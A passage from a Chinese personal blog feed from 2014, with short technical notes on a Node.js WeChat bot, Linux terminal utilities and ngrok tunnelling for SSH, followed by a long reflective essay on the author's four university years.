&lt;p&gt;&lt;img alt="ngrok" src="http://wwjpic.qiniudn.com/ngrok.png" /&gt;)&lt;/p&gt;
&lt;h2&gt;nodejs&lt;/h2&gt;
&lt;p&gt;点击安装node-v0.10.28-x86.msi。随意安装在哪个目录。&lt;br /&gt;
新版的node自带了npm，且会自动将环境变量写入PATH,所以无需配置。&lt;/p&gt;
&lt;h2&gt;npm安装依赖环境&lt;/h2&gt;
&lt;p&gt;进入到wechat目录
执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;npm install  express
npm install weixin-robot
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;账号微信相关&lt;/h2&gt;
&lt;p&gt;首先登录到&lt;a href="https://mp.weixin.qq.com/"&gt;腾讯微信后台&lt;/a&gt;，
weixin:
&lt;img alt="weixin" src="http://wwjpic.qiniudn.com/weixin.png" /&gt;&lt;/p&gt;
&lt;p&gt;参看你的token,将其填入wechat/weixin.js中。weixin.js中有注释。第40行&lt;/p&gt;
&lt;p&gt;token:
&lt;img alt="token" src="http://wwjpic.qiniudn.com/url2.png" /&gt;&lt;/p&gt;
&lt;p&gt;将ngrok返回的url，填入到下图：&lt;/p&gt;
&lt;p&gt;&lt;img alt="url" src="http://wwjpic.qiniudn.com/url2.png" /&gt;&lt;/p&gt;
&lt;h2&gt;后台跑起&lt;/h2&gt;
&lt;p&gt;见证奇迹的时刻到了~ &lt;br /&gt;
进入wechat目录。&lt;br /&gt;
执行&lt;code&gt;node weixin.js&lt;/code&gt;.&lt;br /&gt;
不出意外的话，后台跑起来了。&lt;br /&gt;
可以开始调戏你的公众号啦。&lt;/p&gt;
&lt;h2&gt;使用nodejs后端&lt;/h2&gt;
&lt;p&gt;使用规则，参考这里&lt;a href="https://github.com/node-webot/weixin-robot"&gt;weixin-robot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;更多的使用细节，参考&lt;a href="http://mp.weixin.qq.com/wiki/index.php"&gt;微信api&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;自动回复规则,&lt;a href="https://github.com/node-webot/wechat"&gt;参考这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;That`s all. enjoying it&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 16 Jun 2014 00:00:00 +0000</pubDate><guid>tag:,2014-06-16:use-nodejs-in-windows.html</guid><category>wechat</category></item><item><title>linux终端小工具使用笔记</title><link>/use-gpm.html</link><description>&lt;p&gt;目前包括：（陆续添加）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gpm&lt;/li&gt;
&lt;li&gt;w3m&lt;/li&gt;
&lt;li&gt;wget&lt;/li&gt;
&lt;li&gt;nethogs &lt;/li&gt;
&lt;li&gt;axel 参数 文件下载地址&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;gpm&lt;/h2&gt;
&lt;h3&gt;用途&lt;/h3&gt;
&lt;p&gt;在没有图形界面的情况下使用鼠标来移动选择．&lt;/p&gt;
&lt;p&gt;通过左键单击来选择适当的文本输入框，然后按下&lt;code&gt;鼠标中键&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install gpm
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;使用方法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo service gpm start
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;参考&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.it165.net/os/html/201212/4087.html"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;w3m&lt;/h2&gt;
&lt;h3&gt;用途&lt;/h3&gt;
&lt;p&gt;在命令行里上网&lt;/p&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install w3m
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;使用方法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;w3m URL&lt;/code&gt; ：打开网页&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hjkl&lt;/code&gt;:移动操作类似vim&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TAB&lt;/code&gt;: 转到下个超链接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更多功能，参考&lt;a href="http://baike.baidu.com/view/455886.htm"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;wget&lt;/h2&gt;
&lt;h2&gt;nethogs&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get install nethogs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;监控网速&lt;/p&gt;
&lt;p&gt;使用：&lt;code&gt;sudo nethogs wlan0&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;axel&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get install axel&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用：&lt;code&gt;axel 参数 文件下载地址&lt;/code&gt;，例如&lt;code&gt;axel -n 10 url&lt;/code&gt;,开启十个线程。下载链接可以用chrometool分析&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 10 Jun 2014 00:00:00 +0000</pubDate><guid>tag:,2014-06-10:use-gpm.html</guid><category>ubuntu</category></item><item><title>ngrok使用笔记</title><link>/use-ngrok.html</link><description>&lt;h3&gt;ngrok是什么&lt;/h3&gt;
&lt;p&gt;神器．&lt;/p&gt;
&lt;p&gt;将内网映射到外网的神器．&lt;/p&gt;
&lt;p&gt;我之前用它来&lt;a href="http://wwj718.github.io/locale-wechat.html"&gt;在局域网里搭建微信后台&lt;/a&gt;．&lt;/p&gt;
&lt;p&gt;它不仅可以映射http协议，还可以映射普通的tcp．&lt;/p&gt;
&lt;p&gt;就是说它不仅可以把你的局域网里的网站映射到外网，还可以把ssh映射到外网．实现外网登陆ssh&lt;/p&gt;
&lt;p&gt;具体用途，自己发挥想象&lt;/p&gt;
&lt;h3&gt;让外网ip可以登陆内网ssh&lt;/h3&gt;
&lt;p&gt;把内部网站映射到外网和把微信后台映射出去完全相同，我之前写过博客，就不赘述了．&lt;/p&gt;
&lt;p&gt;今天讨论把ssh的22号端口映射出去&lt;/p&gt;
&lt;p&gt;十分简单&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ngrok.com/download"&gt;下载&lt;/a&gt;完ngrok后，解压到当前文件夹&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./ngrok -proto=tcp 22
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;执行以上代码，返回类似信息&lt;code&gt;tcp://ngrok.com:50292 -&amp;gt; 127.0.0.1:22&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是我们就可以外网登陆了．&lt;/p&gt;
&lt;pre&gt;
ssh username@ngrok.com -p 50292
&lt;/pre&gt;

&lt;h3&gt;更多定制&lt;/h3&gt;
&lt;p&gt;比如定制二级域名&lt;/p&gt;
&lt;p&gt;付费的话还可以绑定域名&lt;/p&gt;
&lt;p&gt;参考&lt;a href="https://ngrok.com/usage"&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://dorole.com/tag/ngrok/"&gt;这篇&lt;/a&gt;参考文章也很棒&lt;/p&gt;
&lt;h3&gt;tcp相关&lt;/h3&gt;
&lt;p&gt;./ngrok -proto=tcp &lt;port&gt;&lt;br /&gt;
使用tcp的话,通用性更强，http能做到的tcp自然都行。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 10 Jun 2014 00:00:00 +0000</pubDate><guid>tag:,2014-06-10:use-ngrok.html</guid><category>ngrok</category></item><item><title>四年</title><link>/four-year.html</link><description>&lt;blockquote&gt;
&lt;p&gt;“当你还在我身边,我就开始怀念,因为我知道你即将离去”  --米兰.昆德拉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;大学四年比我想象的，要快得多。&lt;/p&gt;
&lt;p&gt;也有趣得多。&lt;/p&gt;
&lt;p&gt;近日学校发了份小册子，让写四年来的总结。&lt;/p&gt;
&lt;p&gt;只半页不到的空间，哪里写得完。&lt;/p&gt;
&lt;p&gt;想认真梳理一下我的大学时光。&lt;/p&gt;
&lt;p&gt;我怕等我踏上离开的火车，之后投入工作，之后琐事缠身，之后奔波劳碌，之后柴米油盐。&lt;/p&gt;
&lt;p&gt;之后等我偶然想起起这段时光的时候。&lt;/p&gt;
&lt;p&gt;却只能想到，那个地方，有春风明月，夜色朦胧；三两知己，姓名已忘。&lt;/p&gt;
&lt;p&gt;只能惆怅地点上一根烟。天边落日，人海沉浮。&lt;/p&gt;
&lt;p&gt;想用文字抓住些什么。&lt;/p&gt;
&lt;h3&gt;大一.快意恩仇&lt;/h3&gt;
&lt;h4&gt;1&lt;/h4&gt;
&lt;p&gt;是我爸坚持要送我去学校的。&lt;/p&gt;
&lt;p&gt;老爸平时总嫌我不够独立，等我兴致勃勃地同他商量这次我决定自己出远门的时候，他又开始不放心了。&lt;/p&gt;
&lt;p&gt;第一次绕了远路，足足坐了30来个小时火车才到学校，而后帮我安顿好东西，第二天他就返程了。&lt;/p&gt;
&lt;p&gt;后来我妈说，坐了太久火车的缘故，回家后，老爸脚都有些浮肿，当时鼻子一酸。&lt;/p&gt;
&lt;p&gt;我写下这段话的时候，竟有种想哭的冲动。&lt;/p&gt;
&lt;h4&gt;2&lt;/h4&gt;
&lt;p&gt;军训不值一提，无聊程度甚于课堂，又充满强迫。带我们的教官，义正言辞地推崇丛林法则，活着就是为了吃好喝好，成为人上人，脸上写满，你们这群图样图森破的书呆子。&lt;/p&gt;
&lt;p&gt;无知者无畏，又无聊。&lt;/p&gt;
&lt;p&gt;军训结束的那天,有晚会,大家一副难舍难分的样子,斯德哥尔摩综合征.我戴着耳机，听的歌都是小楼写的词，听得入神。&lt;/p&gt;
&lt;p&gt;后来我知道有一个词是我当时想表达,却表达不来的，米兰.昆德拉在《生命中不能承受之轻》里描述的“Kitsch”。&lt;/p&gt;
&lt;p&gt;有人翻译为“媚俗”。&lt;/p&gt;
&lt;p&gt;我很喜欢知乎上讨论军训的这段话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;独立和自由是属于勇敢者的。唯有那些敢于把自己解剖的血淋淋的给自己看的人，才能获得独立和自由。那些廉价的眼泪，易得的感动，只是弱者证明自己活过的安慰剂。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我也喜欢刘瑜提到的她朋友的这首诗《一个人要像一支队伍》&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;怀才不遇，逆水行舟，一个人就像一支队伍，对着自己的头脑和心灵招兵买马，不气馁，有召唤，爱自由&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当然，那时没有这些觉悟，只是纯粹觉得军训无聊。还以为是自己生性孤僻。&lt;/p&gt;
&lt;h4&gt;3&lt;/h4&gt;
&lt;p&gt;初来乍到，老实巴交的。也不懂学校的规则，如履薄冰，生怕落人之后。&lt;/p&gt;
&lt;p&gt;人家参加学生会，我也参加学生会，人家挤入二餐厅，我也挤入二餐厅。&lt;/p&gt;
&lt;p&gt;日子过的白开水一般。&lt;/p&gt;
&lt;p&gt;直到某个晴朗的午后，开始逛图书馆。&lt;/p&gt;
&lt;h4&gt;4&lt;/h4&gt;
&lt;p&gt;最初看的是武侠，废寝忘食的看，夜以继日的看，从《天龙八部》看到《白马啸西风》；从《天涯·明月·刀》看到《三少爷的剑》。&lt;/p&gt;
&lt;p&gt;我喜欢这样的独来独往，萍水江湖，相逢一笑，快意恩仇。&lt;/p&gt;
&lt;p&gt;《红楼梦》也是这个时候开始看的，我想这是正好的时间。早上半年，为高考而看，边看边琢磨是不是会考，真是无趣之极；晚上半年，又没有这么集中，悠闲而平静的时间。那个时候，他们一下全都从书里活了过来。我在阳台的角落，看到拍案叫绝，看到怦然心动，看到泪流满面。&lt;/p&gt;
&lt;p&gt;图书馆武侠区和诗词区挨着，在同个书架上，偶尔也去诗词区蹭蹭，和文艺妹子混个眼熟。&lt;/p&gt;
&lt;p&gt;陈章鱼在知乎有名句曰：“人丑就该多读书”，可我在学校遇到的漂亮妹子，却多是在图书馆的角落。&lt;/p&gt;
&lt;p&gt;想起知乎上的这个提问&lt;a href="http://www.zhihu.com/question/21723192"&gt;怎么看待「智慧与美貌不可兼得」的说法？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有回复曰：那是为了安慰我们这些长得不好看的人,别当真 ^_^&lt;/p&gt;
&lt;h4&gt;5&lt;/h4&gt;
&lt;p&gt;最初喜欢上诗词可能是由于仙剑，这款游戏里有不少诗词，当时爱的死去活来，倒背如流，现在看来颇为粗糙，却也是喜欢的。&lt;/p&gt;
&lt;p&gt;就好比你回想起初恋，妹子未必美若天仙，也许都算不上漂亮，却依旧是一种不可替代的美好，和煦如三月阳光。&lt;/p&gt;
&lt;p&gt;开始认真学习格律，读的是王力的《诗词格律概要》，到平仄问题不大时，读了些诗论，想学得技法，读《诗法举隅》，《中国诗句法论》，《诗境浅说》......后来知是缘木求鱼。不过这几本书倒是都很有趣。&lt;/p&gt;
&lt;p&gt;写得一手好诗往往依赖于性情，天分，阅历。技巧是重要的，从技巧入手却实在误人。似乎读懂这些诗论后，却一句话也写不出，感觉试图在用推理来写诗。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;像一个笨手笨脚的人捉蝴蝶，气喘吁吁，却怎么也逮不到文字的感觉。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我的天分显然太低。不过我喜欢这个东西，也就不在意这些了，写好写坏是一回事，乐在其中，也没打算用它换得赞誉之类。&lt;/p&gt;
&lt;p&gt;常常觉得，爱好对你的最大奖赏是让你乐在其中，不知四季轮回。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不为无益之事,何以遣有涯之生。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;读了很多诗集，《千山集》《月出集》《隔雨集》《空花集》《枕手集》&lt;/p&gt;
&lt;p&gt;喜欢孟依依，醉卧长安，发初覆眉，落花风雨，慕容饼...&lt;/p&gt;
&lt;p&gt;喜欢诗词论坛里的人们。&lt;/p&gt;
&lt;p&gt;赤子之心。&lt;/p&gt;
&lt;h3&gt;大二.三观尽毁&lt;/h3&gt;
&lt;h4&gt;1&lt;/h4&gt;
&lt;p&gt;大一一年下来，最大的收获大概要算养成了隔三差五逛图书馆的习惯，静得下心沉到书里，乐不思蜀。开心的时候逛，疑惑的时候逛，天晴逛，雾霾也逛。&lt;/p&gt;
&lt;p&gt;一年下来也读了百来本书。大多是武侠 诗词。&lt;/p&gt;
&lt;p&gt;我看武侠要比大多人要慢，有时候合上书，想象当时场景，心惊肉跳；有时，春意盎然。&lt;/p&gt;
&lt;p&gt;也开始写些东西，当然，各种矫情，不接地气。&lt;/p&gt;
&lt;p&gt;怎样都好，终究是上路了。&lt;/p&gt;
&lt;h4&gt;2&lt;/h4&gt;
&lt;p&gt;开始养成随手记笔记的习惯，最初记在短信草稿箱里。&lt;/p&gt;
&lt;p&gt;突然的灵感，有趣的经历，奇妙的心境，近来的计划，想到什么便记下。在春风明月的夜晚，在声色犬马的ktv,在阳光和煦的操场。&lt;/p&gt;
&lt;p&gt;唯一可惜的就是，在澡堂的时候，其实最容易冒出有趣的想法，没有办法记下，稍纵即逝。&lt;/p&gt;
&lt;p&gt;如此一来，生活慢慢变得有了条理，灵感也越来越多。&lt;/p&gt;
&lt;p&gt;尽管那个时候我还没有开始使用博客和印象笔记这些更强大的工具。&lt;/p&gt;
&lt;h4&gt;3&lt;/h4&gt;
&lt;p&gt;哦，我忘了说，我很喜欢这里的澡堂。&lt;/p&gt;
&lt;p&gt;尤其是冬天的时候，脱得精光跑进去。&lt;/p&gt;
&lt;p&gt;水汽氤氲。  &lt;/p&gt;
&lt;p&gt;热气袭人。&lt;/p&gt;
&lt;p&gt;我洗澡要比舍友慢上许多，以至于久等的舍友以为澡堂里有另一条通道回去，要不然他等在华龙道却迟迟不见我路过。&lt;/p&gt;
&lt;p&gt;我常常挑个水量大的位置，水量不大也没关系，我发现控制水量的刷卡机器有个bug,知道怎么调大水量^_^,学校的其他bug就不说了，免得带坏学弟学妹。&lt;/p&gt;
&lt;p&gt;窗外下着大雪，人在澡堂，热气腾腾的热水迎面扑来,闭上眼睛，各种走神，一会穿越到新读的武侠里，调戏一下女主；一会儿穿越到构思中，发散它。&lt;/p&gt;
&lt;p&gt;此间之乐，不足为外人道也。&lt;/p&gt;
&lt;p&gt;这才理解了这句话，最有趣的是你的想象力。一个想象力贫乏的人，是多么可怜，他只能看到肉眼所见，他跳不出时间，跳不出空间，他看不到眼下之外的东西，他的所有感官只对正在经历的时间片段发生感知，而这个当下是多么狭小局促。&lt;/p&gt;
&lt;p&gt;相比之下，那狭小的洗澡间又是多么广阔。&lt;/p&gt;
&lt;h4&gt;4&lt;/h4&gt;
&lt;p&gt;这一年，混了个校三好和二等奖学金，离一等还挺近，还真当自己是学霸了，不过是突击的时间由三天变为四天的缘故。机械和物理方面的成绩都挺高，也许是有些兴趣。发现自己的空间想象力挺好。&lt;/p&gt;
&lt;p&gt;也给学校投过一些文字，石沉大海或是未得头筹。一怒之下再不参加任何征文。&lt;/p&gt;
&lt;p&gt;冠冕堂皇地说工科学校眼光之低，令人咋舌。&lt;/p&gt;
&lt;p&gt;幼稚可笑啦。&lt;/p&gt;
&lt;p&gt;其实很感激这段经历。最初也许还是出于自尊心受挫，不愿受打击才不投稿，后来养成习惯了，也渐渐愿意为自己写东西，或是记录美好，或是打发无聊。&lt;/p&gt;
&lt;p&gt;渐渐能接地气，把文字当做工具，而不是花瓶。不会再为了给人看，半天挤出一坨奇形怪状的矫情句子。&lt;/p&gt;
&lt;h4&gt;5&lt;/h4&gt;
&lt;p&gt;我觉得我的成长常常和一些书籍是挂钩的，不过我不相信一本书籍能改变一生。&lt;/p&gt;
&lt;p&gt;一个盲目的人，你给他看最美的烟火，也只是一团漆黑。没有戏谑的意思，相反，我觉得同情。&lt;/p&gt;
&lt;p&gt;而如果思想盲目，再好的视力也无济于事。短视与视力无关。&lt;/p&gt;
&lt;p&gt;一本书帮到你，常常是你正在开始关注这本书谈论的话题，你有了疑惑，它恰好点拨了你，这个时候书籍才与你发生作用。&lt;/p&gt;
&lt;p&gt;这一年里，开始阅读哲学相关的东西，我想每个人都有形而上的疑惑吧，区别在于你是面对还是逃避。&lt;/p&gt;
&lt;p&gt;夜深人静的时候，我不知到你是不是也疑惑过所做作为是否有意义，而意义到底又是什么，是不是也想到我终究一死，我的父母，我的朋友，我在路上碰到的那些漂亮的陌生的面孔，终有一天要被时间碾碎，想到这里你是不是也开始节节败退，像有一个黑影在逼近你.我没有从现实里抓到一根救命稻草，大家眼神里写满了你这是杞人忧天。然后投奔到鸡毛蒜皮里。&lt;/p&gt;
&lt;p&gt;其实他们的眼神里还可能有愤怒，你让他们面对了他们不敢面对的东西。这些无解的东西。&lt;/p&gt;
&lt;p&gt;我只能阅读了，而后发现，历史上那么多人那么多有趣的家伙都在思考这些东西，另一番天地。&lt;/p&gt;
&lt;p&gt;你知道吗，我在图书馆的角落，翻着无人问津，积了灰尘的旧书。直到今天也依然觉得那是最炫酷最风云变化最石破天惊的时刻。&lt;/p&gt;
&lt;p&gt;从周国平到休谟，从笛卡尔到帕斯卡尔，读的算不上深，却有天翻地覆的感觉。&lt;/p&gt;
&lt;p&gt;笛卡尔的”我思“，帕斯卡尔的”赌博论“，休谟对因果的质疑，维特根斯坦的语言转向，让我拍案叫绝，让我热泪盈眶。&lt;/p&gt;
&lt;p&gt;这些东西帮我打开了一扇窗，一种新的可能。&lt;/p&gt;
&lt;p&gt;开始热爱阅读。开始理性思考。开始享受一个人的阅读时光。&lt;/p&gt;
&lt;h3&gt;大三.乐不思蜀&lt;/h3&gt;
&lt;h4&gt;1&lt;/h4&gt;
&lt;p&gt;我喜欢下雪，北方的雪，踩在脚下吱吱作响，落于肩上渐积渐厚的雪。&lt;/p&gt;
&lt;p&gt;我在下雪天里，取了几本闲书、笔记，爬到教十一的五楼，看雪、看书、看书中雪里人们的悲欢离合。&lt;/p&gt;
&lt;p&gt;在下雪天里叫上小伙伴到操场散步，不带伞，不戴帽子。聊着不着边际的话，聊到哈哈大笑，聊到瑟瑟发抖。&lt;/p&gt;
&lt;p&gt;这个时候诗词似乎也有些进步了。&lt;/p&gt;
&lt;p&gt;一口气写了六首(选四)&lt;/p&gt;
&lt;pre&gt;
有雪天上来（古风几首）
晨起，大雪

其一
有雪天上来，说与故人知。
故人嫌味浅：下回须寄诗

其二
有雪天上来，何处梅花开。
卿说江南有，能寄一枝来

其三
有雪天上来，人间染尘埃。
那时雪清澈，送别的月台。

其六
有雪天上来，有雪入梦来。
我自梦中醒，此景梦之外？
&lt;/pre&gt;

&lt;p&gt;也写绝句，按照新韵&lt;/p&gt;
&lt;pre&gt;
初雪 几篇

其二
睡衣赤脚到窗沿，看雪心情仍少年。
楼外追逐着稚子，时光穿越到从前。

其三
屋顶初匀雪尚新，两三短信报知音。
访戴途中卿莫返，轻舟借我到湖心。

闻知建阳下雪（建阳是我家乡）
昔时往矣柳依依，一夜春风花满堤。
问谁折取一株雪，留与归人看到迷。
&lt;/pre&gt;

&lt;p&gt;我也许喜欢的不只是雪，我开始有点喜欢这个地方了。&lt;/p&gt;
&lt;p&gt;中秋寄人的诗中写道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;此地人还好，他乡月也圆&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;2&lt;/h4&gt;
&lt;p&gt;偶然的机会逛科技区看到headfirst系列书籍。从此喜欢上编程。&lt;/p&gt;
&lt;p&gt;喜欢这种轻松的教学方式，如看小说玩游戏一般。&lt;/p&gt;
&lt;p&gt;一旦你喜欢一样东西，是根本不需要努力啦耐心啦这些东西,&lt;/p&gt;
&lt;p&gt;人们有时会问你为何有毅力坚持下来。其实有些莫名其妙，你有问过玩游戏的小伙伴是如何坚持的吗，你有问过偷菜的小伙伴何以有毅力半夜准时偷菜吗？&lt;/p&gt;
&lt;p&gt;喜欢而已。&lt;/p&gt;
&lt;p&gt;就像你会因为喜欢一个妹子，改掉你多年睡懒觉的陋习，只为给她准时买上豆浆和面包，因为她胃不好. 按时吃早餐能好受些.&lt;/p&gt;
&lt;p&gt;入门之后，剩下的就是时间和用心的问题了。&lt;/p&gt;
&lt;p&gt;决定用学习诗词的方法学习编程，大体来说就是多看好书，不懂得问题记在笔记上，把反复出现的东西搞懂，这些往往是核心概念。模仿着起步，边学边用。&lt;/p&gt;
&lt;p&gt;最后一点最重要.&lt;/p&gt;
&lt;p&gt;有时会因为想搞懂一个百思不得其解的问题,翘课去图书馆泡上半天;在长途火车上看文档看的津津有味;在手机里装上qpython,随时验证想法,它还能跑上完整的django网站呢.&lt;/p&gt;
&lt;p&gt;这段时间,邂逅web，邂逅python，邂逅linux，邂逅开源，喜欢上这些东西，近乎废寝忘食。&lt;/p&gt;
&lt;p&gt;后来也因此邂逅了志同道合的小伙伴们。&lt;/p&gt;
&lt;h3&gt;大四.指间岁月&lt;/h3&gt;
&lt;p&gt;人物相关的都写在最后部分,大多相遇于大二大三.&lt;/p&gt;
&lt;h4&gt;1&lt;/h4&gt;
&lt;p&gt;一生知己不多人。 &lt;/p&gt;
&lt;p&gt;我该是多么的侥幸,才能遇到你们.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;于千万人之中遇见你所要遇见的人，于千万年之中，时间的无涯的荒野里，没有早一步，也没有晚一步，刚巧赶上了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;哦,原来你也在这里.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;我喜欢自然山水，喜欢田园风光，喜欢骑着我的破单车，四处闲逛．漫无目的，不看时间．&lt;/p&gt;
&lt;p&gt;兴之所至，欣然而往，咏而归．&lt;/p&gt;
&lt;p&gt;有趣的是，你也是．&lt;/p&gt;
&lt;p&gt;我们骑遍周边村落，遇上赶集我会买些香蕉，一口气吃三根是不成问题的．&lt;/p&gt;
&lt;p&gt;我骑车去玩的时候喜欢闲扯我最近又看了电影，喜欢什么书，我常常记不得明天要交什么作业，后天那节课上要不要点名．&lt;/p&gt;
&lt;p&gt;不过我都记得看过的好书，精彩的电影，有趣的故事，漂亮的句子．&lt;/p&gt;
&lt;p&gt;我很吃惊，我同你聊大卫休谟的时候，你居然一下就理解了休谟的意思，我喜欢举休谟耍赖的例子，他质疑因果率，却不敢用脚踢石头，我同别人说的时候，他们都一脸茫然，你的眼睛简直在发光．就和我第一次听到休谟的这个观点一样．&lt;/p&gt;
&lt;p&gt;我喜欢同你这样同我一样有点傻有点聪明的人聊天，也很高兴你能认真地听我天花乱坠地吹牛．&lt;/p&gt;
&lt;p&gt;我喜欢同你辩论，其实我在耍赖，我以多欺少，我常常从书里拉来帮手，我引用历史上那些聪明脑袋想出的的论点，却不说是引用，这些论点在历史上都难倒无数智者，让你哑口无言当然就不成问题了．我变化着用怀疑论，功利主义，经验主义，轮番祭上康德，波普尔，哈耶克，你目眩口呆，惊叹我睿智得不行，废话，我都抄袭了这么多天才的观点．&lt;/p&gt;
&lt;p&gt;其实真正惊叹的是我，我看这些东西花了很长很长时间，而同你争论片刻，你居然就知道争论的核心是什么，不跑题，能理解，甚至能偶尔反击．&lt;/p&gt;
&lt;p&gt;这个过程我意识到这种辩论在提高我的表达能力，虽然我看书时觉得理解一些了，可理解和表达是两回事，如果我的表达能力有所提高，那大多都是你的功劳．&lt;/p&gt;
&lt;p&gt;有时我们也谈论经历过的有趣的事．你的记性和我一样糟糕，你小时候不写寒假作业，开学前着急的通宵，这件事你起码说过三遍，还说的那么起劲，末了加一句我之前和你说过没有，我说没有啊．&lt;/p&gt;
&lt;p&gt;我幡然大悟，我同你说的那么起劲的东西，我是不是也说过多次．我小时候偷西瓜被看到，然后和朋友躲到他家床底下，躲了一个下午，这件事我将绘声绘色，讲得惊心动魄，我是不是也讲过很多次了，你是不是也不好意思打断假装没听过．&lt;/p&gt;
&lt;p&gt;其实，有件事我很抱歉，辩论的时候，我有时会引用一些刻薄的话，我的那些桀骜不逊的偶像们，他们的一些名言刻薄犀利，一针见血，我其实不该在辩论的时候用．&lt;/p&gt;
&lt;p&gt;不过，我想，你是不会在意这些细节的．&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一个到你了．&lt;/p&gt;
&lt;p&gt;该从哪里说起，真是相见恨晚啊，一直聊到了半夜两点．&lt;/p&gt;
&lt;p&gt;我要是想与人搭讪的话，其实和大多数人都能扯上几句，也许还能留下好感，好吧，你也是．&lt;/p&gt;
&lt;p&gt;我要是想用社会工程的话，也许能运用地比较自如，好吧，你也是．&lt;/p&gt;
&lt;p&gt;我要是．．．好吧，你也都是！！&lt;/p&gt;
&lt;p&gt;如果我们有什么不同的话，我的所有这些，基本来自我的阅读，我是个没有什么天分的人．&lt;/p&gt;
&lt;p&gt;而你天生就会，深藏不露．其实我以前不太相信天赋的．这次反正信了．&lt;/p&gt;
&lt;p&gt;殊途同归．真是一见如故．&lt;/p&gt;
&lt;p&gt;那天我提到的模式，是很强大的一个概念，尤其用于处理一些含糊不清的问题，诸如人际问题．而你在还没有这些概念的时候，就能在实际中运用自如了，而且也感知到这种能力，吓了我一跳．&lt;/p&gt;
&lt;p&gt;这个方面你的确比我强大太多．兴趣和天分把你带的很远．我在这方面缺乏热情，不过也由衷欣赏你能把如此游刃有余．&lt;/p&gt;
&lt;p&gt;叹服．&lt;/p&gt;
&lt;p&gt;从你这边学到最强大的东西是执行力，也是我大学里学到最重要的几个东西．尽管你勾搭妹子的能力也堪称一绝．&lt;/p&gt;
&lt;p&gt;我很开心你也能喜欢上阅读．这会是你如虎添翼的东西．&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;嗯,到你了．&lt;/p&gt;
&lt;p&gt;很开心能听到你说,遇到我是件幸运的事.虽然我听到这话的时候,假装镇定.&lt;/p&gt;
&lt;p&gt;两相跌入春风里,草树明花深四围.&lt;/p&gt;
&lt;p&gt;我写不下去.&lt;/p&gt;
&lt;p&gt;留待他年作追忆.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;下段旅程,你一定要,更幸福丰盛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也原谅我飘忽不定爱自由．&lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;2&lt;/h4&gt;
&lt;p&gt;知乎.&lt;/p&gt;
&lt;p&gt;知乎是我不能忽视的存在.&lt;/p&gt;
&lt;p&gt;四年里,知乎对我的影响可以排在第三,前两位是图书馆和朋友.&lt;/p&gt;
&lt;p&gt;如果我需要做出某个决定,而这个决定涉及我所不熟悉领域的知识,我需要一些简洁建议的时候.换做从前,我会咨询身边的人,而现在我会咨询与我相似的人,我指的是观念相似.&lt;/p&gt;
&lt;p&gt;这些人恰好大都聚集在知乎.&lt;/p&gt;
&lt;p&gt;知乎是个有趣的平台,我喜欢这里的温暖,风趣,包容,纯粹,理性,善意和多元,这里满足了许多我对乌托邦的向往.我主要的喜欢的是这里的居民.&lt;/p&gt;
&lt;p&gt;当然在它开放注册后,引来很多乏味的用户,筛选有趣的信息需要费些功夫了现在.&lt;/p&gt;
